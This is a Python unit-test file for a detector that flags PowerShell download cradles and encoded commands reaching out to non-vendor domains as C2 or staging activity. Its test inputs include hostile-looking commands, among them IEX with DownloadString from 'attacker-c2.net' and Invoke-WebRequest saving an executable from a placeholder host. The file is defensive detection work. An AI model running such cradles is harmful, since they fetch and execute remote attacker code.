"""C2/staging-domain surfacing -- universal, structural. All domains here are
GENERIC placeholders (no case value); the signal keys on the download-cradle SHAPE
+ a known-good vendor allowlist, and EXTRACTS whatever non-vendor domain is present.
"""
from sift_sentinel.analysis.malicious_semantics import (
    match_c2_staging_domain, MALICIOUS_SEMANTIC_SIGNALS,
)


def _ps(cmd):
    return {"fact_type": "powershell_command_fact", "command": cmd}


def test_download_cradle_to_nonvendor_domain_fires():
    f = _ps("IEX (New-Object Net.WebClient).DownloadString('http://attacker-c2.net/a.ps1')")
    assert match_c2_staging_domain(f) is True


def test_invoke_webrequest_to_nonvendor_fires():
    f = _ps("Invoke-WebRequest -Uri https://stage.badhost.io/p -OutFile x.exe")
    assert match_c2_staging_domain(f) is True


def test_cradle_to_vendor_domain_does_not_fire():
    f = _ps("IEX (New-Object Net.WebClient).DownloadString('https://download.microsoft.com/x')")
    assert match_c2_staging_domain(f) is False


def test_no_cradle_does_not_fire():
    f = _ps("Get-Process | Where-Object { $_.Name -eq 'foo' }  # mentions example.org")
    assert match_c2_staging_domain(f) is False


def test_filename_token_not_mistaken_for_domain():
    # a cradle-shaped command whose only 'domain-like' tokens are file names
    f = _ps("Invoke-WebRequest( ) ; rundll32.exe powershell.exe payload.dll")
    assert match_c2_staging_domain(f) is False


def test_encoded_command_with_url_fires():
    f = {"fact_type": "decoded_string_fact",
         "decoded": "powershell -encodedcommand ... http://c2-host.org/beacon"}
    assert match_c2_staging_domain(f) is True


def test_registered_as_a_signal():
    assert "c2_staging_domain" in MALICIOUS_SEMANTIC_SIGNALS
    assert MALICIOUS_SEMANTIC_SIGNALS["c2_staging_domain"]["matcher"] is match_c2_staging_domain
